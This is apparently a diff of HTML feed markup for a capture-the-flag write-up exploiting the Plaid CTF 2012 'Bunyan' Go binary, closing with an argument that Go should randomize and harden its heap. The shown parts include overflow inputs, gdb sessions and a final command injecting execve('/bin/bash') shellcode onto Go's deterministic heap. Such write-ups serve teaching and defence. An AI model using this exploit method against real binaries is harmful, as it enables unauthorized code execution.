-&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./webapp --loglevel&lt;span class="o"&gt;=&lt;/span&gt;2 --logfmt&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;AAAAAAAAA%8d&amp;quot;&lt;/span&gt; --address&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:$(perl -e &amp;#39;print &amp;quot;&lt;/span&gt;A&lt;span class="s2"&gt;&amp;quot;x109, &amp;quot;&lt;/span&gt;BBBB&lt;span class="s2"&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
-&lt;span class="go"&gt;AAAAAAAAA       1Listening on :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&lt;/span&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./webapp --loglevel&lt;span class="o"&gt;=&lt;/span&gt;2 --logfmt&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;span class="caps"&gt;AAAAAAAAA&lt;/span&gt;%8d&amp;quot;&lt;/span&gt; --address&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:$(perl -e &amp;#39;print &amp;quot;&lt;/span&gt;A&lt;span class="s2"&gt;&amp;quot;x109, &amp;quot;&lt;/span&gt;&lt;span class="caps"&gt;BBBB&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
+&lt;span class="go"&gt;&lt;span class="caps"&gt;AAAAAAAAA&lt;/span&gt;       1Listening on :&lt;span class="caps"&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&lt;/span&gt;&lt;/span&gt;
 &lt;span class="go"&gt;unexpected fault address 0x42424242&lt;/span&gt;
 &lt;span class="go"&gt;throw: fault&lt;/span&gt;
 &lt;span class="go"&gt;[signal 0xb code=0x1 addr=0x42424242 pc=0x42424242]&lt;/span&gt;
@@ -605,7 +605,7 @@ We will construct an exploit that takes advantage of all of these properties. Fi
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Now that we have code execution (and we know the vulnerable function due to the helpful stack trace), we &lt;tt&gt;objdump&lt;/tt&gt; the function and put a breakpoint before returning to our clobbered return address.&lt;/p&gt;
+&lt;p&gt;Now that we have code execution (and we know the vulnerable function due to the helpful stack trace), we &lt;tt&gt;objdump&lt;/tt&gt; the function and put a breakpoint before returning to our clobbered return&amp;nbsp;address.&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="mh"&gt;080624d0&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nf"&gt;Log&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;:&lt;/span&gt;
 &lt;span class="x"&gt; 80624d0:       81 ec 9c 00 00 00       sub    $0x9c,%esp&lt;/span&gt;
 &lt;span class="x"&gt; 80624d6:       8b 84 24 a4 00 00 00    mov    0xa4(%esp),%eax&lt;/span&gt;
@@ -632,13 +632,13 @@ We will construct an exploit that takes advantage of all of these properties. Fi
 
 &lt;p&gt;and&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb webapp
-&lt;span class="go"&gt;GNU gdb (Ubuntu/Linaro 7.3-0ubuntu2) 7.3-2011.08&lt;/span&gt;
+&lt;span class="go"&gt;&lt;span class="caps"&gt;GNU&lt;/span&gt; gdb (Ubuntu/Linaro 7.3-0ubuntu2) 7.3-2011.08&lt;/span&gt;
 &lt;span class="go"&gt;Copyright (C) 2011 Free Software Foundation, Inc.&lt;/span&gt;
-&lt;span class="go"&gt;License GPLv3+: GNU GPL version 3 or later&lt;/span&gt;
+&lt;span class="go"&gt;License GPLv3+: &lt;span class="caps"&gt;GNU&lt;/span&gt; &lt;span class="caps"&gt;GPL&lt;/span&gt; version 3 or later&lt;/span&gt;
 &lt;span class="go"&gt;This is free software: you are free to change and redistribute it.&lt;/span&gt;
-&lt;span class="go"&gt;There is NO WARRANTY, to the extent permitted by law.  Type &amp;quot;show copying&amp;quot;&lt;/span&gt;
+&lt;span class="go"&gt;There is &lt;span class="caps"&gt;NO&lt;/span&gt; &lt;span class="caps"&gt;WARRANTY&lt;/span&gt;, to the extent permitted by law.  Type &amp;quot;show copying&amp;quot;&lt;/span&gt;
 &lt;span class="go"&gt;and &amp;quot;show warranty&amp;quot; for details.&lt;/span&gt;
-&lt;span class="go"&gt;This GDB was configured as &amp;quot;i686-linux-gnu&amp;quot;.&lt;/span&gt;
+&lt;span class="go"&gt;This &lt;span class="caps"&gt;GDB&lt;/span&gt; was configured as &amp;quot;i686-linux-gnu&amp;quot;.&lt;/span&gt;
 &lt;span class="go"&gt;For bug reporting instructions, please see:&lt;/span&gt;
 &lt;span class="go"&gt;...&lt;/span&gt;
 &lt;span class="go"&gt;Reading symbols from /tmp/build/webapp...done.&lt;/span&gt;
@@ -648,12 +648,12 @@ We will construct an exploit that takes advantage of all of these properties. Fi
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;We run our exploit again, and then search the heap for our string (we know that the heap is always in the range &lt;tt&gt;[0x18600000, 0x18900000]&lt;/tt&gt; for this binary since Go has a deterministic heap).&lt;/p&gt;
-&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;(gdb) run --loglevel=2 --logfmt=&amp;quot;AAAAAAAAA%8d&amp;quot; --address=&amp;quot;:$(perl -e &amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;BBBB&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
-&lt;span class="go"&gt;Starting program: /tmp/build/webapp --loglevel=2 --logfmt=&amp;quot;AAAAAAAAA%8d&amp;quot; --address=&amp;quot;:$(perl -e &amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;BBBB&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
+&lt;p&gt;We run our exploit again, and then search the heap for our string (we know that the heap is always in the range &lt;tt&gt;[0x18600000, 0x18900000]&lt;/tt&gt; for this binary since Go has a deterministic&amp;nbsp;heap).&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;(gdb) run --loglevel=2 --logfmt=&amp;quot;&lt;span class="caps"&gt;AAAAAAAAA&lt;/span&gt;%8d&amp;quot; --address=&amp;quot;:$(perl -e &amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;&lt;span class="caps"&gt;BBBB&lt;/span&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
+&lt;span class="go"&gt;Starting program: /tmp/build/webapp --loglevel=2 --logfmt=&amp;quot;&lt;span class="caps"&gt;AAAAAAAAA&lt;/span&gt;%8d&amp;quot; --address=&amp;quot;:$(perl -e &amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;&lt;span class="caps"&gt;BBBB&lt;/span&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
 &lt;span class="go"&gt;[Thread debugging using libthread_db enabled]&lt;/span&gt;
-&lt;span class="go"&gt;[New Thread 0xb7ccbb70 (LWP 7869)]&lt;/span&gt;
-&lt;span class="go"&gt;AAAAAAAAA       1Listening on :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&lt;/span&gt;
+&lt;span class="go"&gt;[New Thread 0xb7ccbb70 (&lt;span class="caps"&gt;LWP&lt;/span&gt; 7869)]&lt;/span&gt;
+&lt;span class="go"&gt;&lt;span class="caps"&gt;AAAAAAAAA&lt;/span&gt;       1Listening on :&lt;span class="caps"&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&lt;/span&gt;&lt;/span&gt;
 
 &lt;span class="go"&gt;Breakpoint 1, 0x08062537 in Log ()&lt;/span&gt;
 &lt;span class="go"&gt;(gdb) x/a $esp&lt;/span&gt;
@@ -663,10 +663,10 @@ We will construct an exploit that takes advantage of all of these properties. Fi
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;So now we know that our string, which is &lt;tt&gt;:AAAA...AAAABBBB&lt;/tt&gt;, is located at &lt;tt&gt;0x1883cd7b - 4 - 109 = 0x1883cd0e&lt;/tt&gt; on the heap. (Note - this is because string concatenations put strings onto the deterministic heap). But then we are done! We change string to include shell code, and then use our control flow control to jump to it.&lt;/p&gt;
-&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./webapp -loglevel&lt;span class="o"&gt;=&lt;/span&gt;100 -logfmt&lt;span class="o"&gt;=&lt;/span&gt;AAAAAAAAA%8d -address&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;$(perl -e &amp;#39; print &amp;quot;&lt;/span&gt;:&lt;span class="se"&gt;\x&lt;/span&gt;6a&lt;span class="se"&gt;\x&lt;/span&gt;0b&lt;span class="se"&gt;\x&lt;/span&gt;58&lt;span class="se"&gt;\x&lt;/span&gt;99&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;66&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2d&lt;span class="se"&gt;\x&lt;/span&gt;70&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e1&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;6a&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2f&lt;span class="se"&gt;\x&lt;/span&gt;62&lt;span class="se"&gt;\x&lt;/span&gt;61&lt;span class="se"&gt;\x&lt;/span&gt;73&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2f&lt;span class="se"&gt;\x&lt;/span&gt;62&lt;span class="se"&gt;\x&lt;/span&gt;69&lt;span class="se"&gt;\x&lt;/span&gt;6e&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e3&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;51&lt;span class="se"&gt;\x&lt;/span&gt;53&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e1&lt;span class="se"&gt;\x&lt;/span&gt;cd&lt;span class="se"&gt;\x&lt;/span&gt;80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;span class="se"&gt;\x&lt;/span&gt;0e&lt;span class="se"&gt;\x&lt;/span&gt;cd&lt;span class="se"&gt;\x&lt;/span&gt;83&lt;span class="se"&gt;\x&lt;/span&gt;18&lt;span class="s2"&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
-&lt;span class="go"&gt;AAAAAAAAA       1Listening on :j&lt;/span&gt;
-&lt;span class="go"&gt;                Xï¿½Rfh-pï¿½ï¿½Rjhh/bash/binï¿½ï¿½RQSï¿½ï¿½Í€AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÍƒ&lt;/span&gt;
+&lt;p&gt;So now we know that our string, which is &lt;tt&gt;:&lt;span class="caps"&gt;AAAA&lt;/span&gt;&amp;#8230;&lt;span class="caps"&gt;AAAABBBB&lt;/span&gt;&lt;/tt&gt;, is located at &lt;tt&gt;0x1883cd7b - 4 - 109 = 0x1883cd0e&lt;/tt&gt; on the heap. (Note - this is because string concatenations put strings onto the deterministic heap). But then we are done! We change string to include shell code, and then use our control flow control to jump to&amp;nbsp;it.&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./webapp -loglevel&lt;span class="o"&gt;=&lt;/span&gt;100 -logfmt&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="caps"&gt;AAAAAAAAA&lt;/span&gt;%8d -address&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;$(perl -e &amp;#39; print &amp;quot;&lt;/span&gt;:&lt;span class="se"&gt;\x&lt;/span&gt;6a&lt;span class="se"&gt;\x&lt;/span&gt;0b&lt;span class="se"&gt;\x&lt;/span&gt;58&lt;span class="se"&gt;\x&lt;/span&gt;99&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;66&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2d&lt;span class="se"&gt;\x&lt;/span&gt;70&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e1&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;6a&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2f&lt;span class="se"&gt;\x&lt;/span&gt;62&lt;span class="se"&gt;\x&lt;/span&gt;61&lt;span class="se"&gt;\x&lt;/span&gt;73&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2f&lt;span class="se"&gt;\x&lt;/span&gt;62&lt;span class="se"&gt;\x&lt;/span&gt;69&lt;span class="se"&gt;\x&lt;/span&gt;6e&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e3&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;51&lt;span class="se"&gt;\x&lt;/span&gt;53&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e1&lt;span class="se"&gt;\x&lt;/span&gt;cd&lt;span class="se"&gt;\x&lt;/span&gt;&lt;span class="caps"&gt;80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;/span&gt;&lt;span class="se"&gt;\x&lt;/span&gt;0e&lt;span class="se"&gt;\x&lt;/span&gt;cd&lt;span class="se"&gt;\x&lt;/span&gt;83&lt;span class="se"&gt;\x&lt;/span&gt;18&lt;span class="s2"&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
+&lt;span class="go"&gt;&lt;span class="caps"&gt;AAAAAAAAA&lt;/span&gt;       1Listening on :j&lt;/span&gt;
+&lt;span class="go"&gt;                Xï¿½Rfh-pï¿½ï¿½Rjhh/bash/binï¿½ï¿½&lt;span class="caps"&gt;RQS&lt;/span&gt;ï¿½ï¿½Í€&lt;span class="caps"&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;/span&gt;Íƒ&lt;/span&gt;
 &lt;span class="gp"&gt;$&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -676,36 +676,36 @@ Success!
 &lt;/p&gt;
 &lt;h3&gt;Postmortem&lt;/h3&gt;
 &lt;p&gt;
-This exploit is interesting for a number of reasons. First of all, it works on any (32 bit) machine running the same version of Go as the attacker. This is because heap allocations end up being quite deterministic. Next, this type of exploit (jump to an object on the executable heap, such as a string put there via a string concatenation) is something that would be easy to replicate in a variety of Go binaries. Lastly, the executable heap offers an easy surface for heap sprays and other attacks. It is also easy to imagine an expoit that uses a heap overwrite to clobber a closure and get code execution.
+This exploit is interesting for a number of reasons. First of all, it works on any (32 bit) machine running the same version of Go as the attacker. This is because heap allocations end up being quite deterministic. Next, this type of exploit (jump to an object on the executable heap, such as a string put there via a string concatenation) is something that would be easy to replicate in a variety of Go binaries. Lastly, the executable heap offers an easy surface for heap sprays and other attacks. It is also easy to imagine an expoit that uses a heap overwrite to clobber a closure and get code&amp;nbsp;execution.
 &lt;/p&gt;&lt;/p&gt;
 &lt;p&gt;
-It is also important to note that, while the vulnerability is introduced through C code, common C protections such as NX, ASLR, and libc randomization would make this binary very difficult to exploit without the use of the weak Go runtime. I wish to repeat: &lt;em&gt;this binary is easily exploitable because it is a Go binary&lt;/em&gt;, even assuming ASLR, NX, and libc randomization.
+It is also important to note that, while the vulnerability is introduced through C code, common C protections such as &lt;span class="caps"&gt;NX&lt;/span&gt;, &lt;span class="caps"&gt;ASLR&lt;/span&gt;, and libc randomization would make this binary very difficult to exploit without the use of the weak Go runtime. I wish to repeat: &lt;em&gt;this binary is easily exploitable because it is a Go binary&lt;/em&gt;, even assuming &lt;span class="caps"&gt;ASLR&lt;/span&gt;, &lt;span class="caps"&gt;NX&lt;/span&gt;, and libc&amp;nbsp;randomization.
 &lt;/p&gt;
 
 &lt;p&gt;
-I firmly believe that Go should consider randomizing its heap and making it no longer executable. I also think that it is imperative to provide a compiler option that hardens the binary by disabling the printing of debugging information (stack traces, faulting addresses) on program crashes and stripping debugging / package information from the binary. 
+I firmly believe that Go should consider randomizing its heap and making it no longer executable. I also think that it is imperative to provide a compiler option that hardens the binary by disabling the printing of debugging information (stack traces, faulting addresses) on program crashes and stripping debugging / package information from the&amp;nbsp;binary. 
 &lt;/p&gt;
 
-&lt;h3&gt;Go Community Response&lt;/h3&gt;
+&lt;h3&gt;Go Community&amp;nbsp;Response&lt;/h3&gt;
 
 &lt;p&gt;
-For anyone who is interested, the Go community's response is &lt;a href="http://groups.google.com/group/golang-nuts/browse_thread/thread/25df6d94d73a8d41"&gt;here&lt;/a&gt;. In summary: vulnerabilities in Go are extremely unlikely so the engineering/complexity overhead required to implement any of these protections is not worth it. I respectfully disagree - vulnerabilities can come from cgo libraries or from as of yet unknown bugs in the Go runtime itself. Furthermore, I suspect that adding ASLR or NX would not require very much effort.
+For anyone who is interested, the Go community&amp;#8217;s response is &lt;a href="http://groups.google.com/group/golang-nuts/browse_thread/thread/25df6d94d73a8d41"&gt;here&lt;/a&gt;. In summary: vulnerabilities in Go are extremely unlikely so the engineering/complexity overhead required to implement any of these protections is not worth it. I respectfully disagree - vulnerabilities can come from cgo libraries or from as of yet unknown bugs in the Go runtime itself. Furthermore, I suspect that adding &lt;span class="caps"&gt;ASLR&lt;/span&gt; or &lt;span class="caps"&gt;NX&lt;/span&gt; would not require very much&amp;nbsp;effort.
 &lt;/p&gt;
 
-&lt;h3&gt;Other writeups&lt;/h3&gt;
+&lt;h3&gt;Other&amp;nbsp;writeups&lt;/h3&gt;
 
 &lt;p&gt;
 There are writeups of this problem available by:
 &lt;ul&gt;
-    &lt;li&gt;&lt;a href="http://eindbazen.net/2012/05/plaid-ctf-2012-bunyan/"&gt;Eindbazen&lt;/a&gt; (C style return to libc exploit)&lt;/li&gt;
-    &lt;li&gt;&lt;a href="http://www.bases-hacking.org/bunyan-plaidctf2012.html"&gt;w3stormz&lt;/a&gt; (Go heap exploit, in French)&lt;/li&gt;
+    &lt;li&gt;&lt;a href="http://eindbazen.net/2012/05/plaid-ctf-2012-bunyan/"&gt;Eindbazen&lt;/a&gt; (C style return to libc&amp;nbsp;exploit)&lt;/li&gt;
+    &lt;li&gt;&lt;a href="http://www.bases-hacking.org/bunyan-plaidctf2012.html"&gt;w3stormz&lt;/a&gt; (Go heap exploit, in&amp;nbsp;French)&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/p&gt;
 
 &lt;h3&gt;tl;dr&lt;/h3&gt;
 
 &lt;p&gt;
-Go binaries are compiled with a lot of debug info, which some people might want to strip. The Go heap is executable and deterministic, making the exploitation of the pCTF Bunyan problem relatively straightforward.
+Go binaries are compiled with a lot of debug info, which some people might want to strip. The Go heap is executable and deterministic, making the exploitation of the pCTF Bunyan problem relatively&amp;nbsp;straightforward.
 &lt;/p&gt;
 
-&lt;p&gt;&lt;span style="display:none;"&gt;Writeup by Alex Reece, see me on &lt;a href="https://plus.google.com/106589059588263736517?rel=author"&gt;Google&lt;/a&gt;+.&lt;/span&gt; &lt;/p&gt;</summary></entry></feed>
+&lt;p&gt;&lt;span style="display:none;"&gt;Writeup by Alex Reece, see me on &lt;a href="https://plus.google.com/106589059588263736517?rel=author"&gt;Google&lt;/a&gt;+.&lt;/span&gt; &lt;/p&gt;</summary><category term="golang"></category><category term="exploitation"></category></entry></feed>
